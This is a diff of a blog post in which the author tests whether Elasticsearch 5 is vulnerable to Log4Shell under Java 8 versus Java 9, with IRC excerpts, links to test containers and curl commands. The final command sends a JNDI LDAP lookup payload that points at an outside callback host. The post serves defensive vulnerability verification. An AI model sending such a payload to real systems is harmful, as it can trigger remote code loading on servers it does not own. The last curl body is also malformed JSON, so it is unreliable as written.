@@ -13,7 +13,7 @@ This experience had synchrony with the disputations relating to COVID-19, specif
 
 Some of us just need evidence... we need to exploit or at least see proof of exploitability, before drastic action is warranted, for the drastic action could cause undesired side effects to a system that is otherwise working fine. This is scientific. Anything else is unscientific. I am so tired of appeal to authority or majority "consensus" being considered anything but <a href="https://www.developgoodhabits.com/appeal-to-authority/">fallacious. Sadly not everyone takes Logic.</a>
 
-When I'm lost and my team can no longer help me, I turn to IRC. Here's my nice experience sharing this with #elasticsearch on <a href="https://libera.chat/">libera.chat</a> IRC and then helping myself through experimentation.
+When I'm lost I turn to IRC. Here's my nice experience sharing (extending the brainstorming beyond my team) this with #elasticsearch on <a href="https://libera.chat/">libera.chat</a> IRC
 
 ## Fishing Line to Finish Line
 
@@ -32,8 +32,44 @@ i will be downgrading to Java 8 to verify this (the "more vulnerable java") acco
 **keyvan:**
 haHA!!!!!!!! yep, my ES5 with java 8 was vulnerable... but with Java 9 was NOT.. 
 
+### Appendix
+
 ## Eating the Fish
 
-Mainly we've got here a java8 container which is vulnerable to the JNDI attack: https://github.com/kfatehi/docker-elasticsearch5-java8
+Here we have our basic Log4J tester project in which the log4j dependency can be changed easily in the build.gradle file: https://github.com/kfatehi/log4shell-test-log4j-intellij-idea-project
 
-Go ahead and try swapping it for the java9 (here you go: https://keyvan.cloud/files/jre-9.0.1_linux-x64_bin.tar.gz ) and see for yourself.
+Then, for the elasticsearch side of things, we've got here a java8 container which is vulnerable to the JNDI attack: https://github.com/kfatehi/docker-elasticsearch5-java8
+
+Finally, we can swap Java 8 for Java 9 (<a href="https://github.com/kfatehi/docker-elasticsearch5-java8/blob/master/Dockerfile#L16">link in the Dockerfile</a>) and witness that the attack does not work.
+
+## Forcing All Queries to Get Logged
+
+```
+curl -XPUT 'http://localhost:9200/_all/_settings?preserve_existing=true' -d '{
+  "index.search.slowlog.threshold.fetch.debug" : "0ms",
+  "index.search.slowlog.threshold.fetch.info" : "0ms",
+  "index.search.slowlog.threshold.fetch.trace" : "0ms",
+  "index.search.slowlog.threshold.fetch.warn" : "0s",
+  "index.search.slowlog.threshold.query.debug" : "0s",
+  "index.search.slowlog.threshold.query.info" : "0s",
+  "index.search.slowlog.threshold.query.trace" : "0ms",
+  "index.search.slowlog.threshold.query.warn" : "0s"
+}'
+```
+
+## Making the Query
+
+```
+curl -XPUT 'http://localhost:9200/my-index' -d '{
+{
+    "query": {
+        "bool" : {
+            "must" : {
+                "query_string" : {
+                    "query" : "${jndi:ldap://log4shell.huntress.com:1389/uuid...}"
+                }
+            }
+        }
+    }
+}
+```
